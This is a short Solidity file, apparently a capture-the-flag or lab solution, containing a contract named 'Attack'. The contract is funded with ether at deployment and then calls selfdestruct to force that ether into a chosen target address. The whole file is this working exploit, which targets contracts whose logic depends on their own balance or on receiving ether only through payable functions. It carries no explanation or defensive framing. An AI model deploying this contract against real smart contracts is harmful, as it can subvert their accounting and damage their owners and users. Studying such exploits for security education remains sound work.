// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address payable public target;

    constructor(address payable _target) payable{
        target = _target;
    }

    function attack() public{
        selfdestruct(target);
    }
}